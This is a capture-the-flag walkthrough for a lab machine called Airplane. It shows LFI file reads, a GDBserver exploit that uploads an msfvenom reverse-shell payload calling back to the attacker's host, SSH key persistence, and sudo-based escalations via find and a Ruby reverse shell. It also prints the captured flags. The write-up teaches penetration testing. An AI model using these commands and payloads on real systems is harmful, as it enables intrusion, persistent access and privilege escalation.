- - - 
created : 21-07-2025 

Tags : #medium #detailed 
- - - 
# Objective

Wait at least 1-2 minutes after the machine is turned on.  

IP: `MACHINE_IP`
# Recon

## Rustscan - Nmap

First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ rustscan -a airplane.thm -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.242.226:22
Open 10.10.242.226:6048
Open 10.10.242.226:8000
^C
```

# Enumeration

## HTTP (8000)

We go to the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) to start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) :

![Pasted image 20250721211554.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721211554.png)

There's [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) vulnerability, in fact [Escaping](../../3%20-%20Tags/Hacking%20Concepts/Escaping.md) we can download files :

![Pasted image 20250721211856.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721211856.png)

We have 2 users : `hudson & carlos` .

![Pasted image 20250721212447.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721212447.png)

Let's first see which user we are here : `../../../../../../proc/self/environ` :

![Pasted image 20250721212905.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721212905.png)

So we are `hudson`, we try to get user flag but there's not a file in his home path .

## GDBserver (6048)

### LFI script

We have to know what is running on the open port, if [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) doesn't show that probably can't so we may think we can do it with this  [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) tool :

https://github.com/TeneBrae93/offensivesecurity/blob/main/lfi-service-check/lfi-service-check.py

And we run it :
```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ python3 lfi-service-check.py 
usage: lfi-service-check.py [-h] -p PORT -t THREADS
lfi-service-check.py: error: the following arguments are required: -p/--port, -t/--threads
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ python3 lfi-service-check.py -p 6048 -t 50

The service running on port 6048 is: /usr/bin/gdbserver 0.0.0.0:6048 airplane 

```

So it's GDBserver .
# Exploit

## HackTricks

We can go to [HackTricks](../../3%20-%20Tags/Hacking%20Tools/HackTricks.md) to find the manual [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :

![Pasted image 20250722160502.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722160502.png)

## MsfVenom

We can use [MsfVenom](../../3%20-%20Tags/Hacking%20Tools/MsfVenom.md) to create our payload and make it executable :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.162.183 LPORT=1337 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ ls   
binary.elf  environ  lfi-service-check.py  passwd
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ chmod +x *.elf
                                                        
```

Now we run it :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ gdb binary.elf 
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)

(gdb) target extended-remote airplane.thm:6048

(gdb) remote put binary.elf /tmp/binary.elf

```

## Netcat

Now the listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ nc -lvnp 1337    
listening on [any] 1337 ...

```

Now we run it :

```bash
(gdb) set remote exec-file /tmp/binary.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /tmp/binary.elf from remote target...
Reading /tmp/binary.elf from remote target...
Reading symbols from target:/tmp/binary.elf...
(No debugging symbols found in target:/tmp/binary.elf)
[Detaching after fork from child process 2934]
[Inferior 1 (process 2933) exited normally]
```

And we have initial access :

```bash
 ┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ nc -lvnp 1337    
listening on [any] 1337 ...

connect to [10.8.162.183] from (UNKNOWN) [10.10.12.222] 40840
whoami
hudson
ls
airplane
```

## Shell Stabilization

We can do [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                
hudson@airplane:/opt$ ^Z                                                                                                      
zsh: suspended  nc -lvnp 1337                                                                                                 
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
hudson@airplane:/opt$ 
```

# Lateral Movement - Privilege Escalation 

## Permanence setting

We have access to the .ssh folder so let's just echo our key there, first we create a folder :

```bash
hudson@airplane:/home/hudson/.ssh$ touch authorized_keys
hudson@airplane:/home/hudson/.ssh$ ls
authorized_keys
```

Now we copy our public key on our machine :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/.ssh]
└─$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
```

And we echo in the folder :

```bash
hudson@airplane:/home/hudson/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@hudson@airplane:/home/hudson/.ssh$ ls
authorized_keys
hudson@airplane:/home/hudson/.ssh$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali
```

## SSH Hudson

Now we can access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with our private key :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Medium/Airplane]
└─$ ssh -i /home/mdn0x/.ssh/id_ed25519 hudson@airplane.thm  
The authenticity of host 'airplane.thm (10.10.12.222)' can't be established.
ED25519 key fingerprint is SHA256:9q23c/CHFWNnqEDK/eQFZ2BSYcCGfCW3+A9hX0ubHj0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'airplane.thm' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hudson@airplane:~$ 

```

## LinPEAS 

We can use [LinPEAS](../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) to find vulnerabilities, lit will find we can run `find` as sudo .
## GTFObins

We can go to [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) and find what we need to escalate :

![Pasted image 20250722163428.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722163428.png)

So let's give that a shot :

```bash
hudson@airplane:~$ /usr/bin/find -exec /bin/sh -p \; -quit
$ whoami
carlos
$ ls
app  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
$ cd ..
$ ls
carlos  hudson
$ cd carlos
$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
$ cat user
cat: user: No such file or directory
$ cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
```

We can access `carlos` on ssh to have a more stable shell without stabilizing it, we'll follow the same path as other user, echo our public key in .ssh folder :

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJA+tMna9rGddaMWghUGuaN4hjdebm4RXFbqx62kiItg mdn0x@mdn0xonKali' >> authorized_keys
```

We can't because we are `carlos` as `hudson` we need to update permissions :

```bash
chmod 644 authorized_keys
```

## SSH Carlos

Now we can really start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we check :

```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb

```

## GTFObins

We can search for ruby sudo :

![Pasted image 20250722165117.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722165117.png)

But won't work cause we're not in root directory, we can escape this somehow .

## Reverse Shell 

We can download a simple Ruby [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) :

![Pasted image 20250722171025.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722171025.png)

We [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) it in the target machine and make it executable :

```bash
carlos@airplane:~$ nano shell.rb
carlos@airplane:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  shell.rb  Templates  user.txt  Videos
carlos@airplane:~$ chmod +x shell.rb 
```

We setup the [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and we execute with the path :

```bash
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/shell.rb

# cat /root/root.txt
190dcbeb688ce5fe029f26a1e5fce002
```

Pwned !!

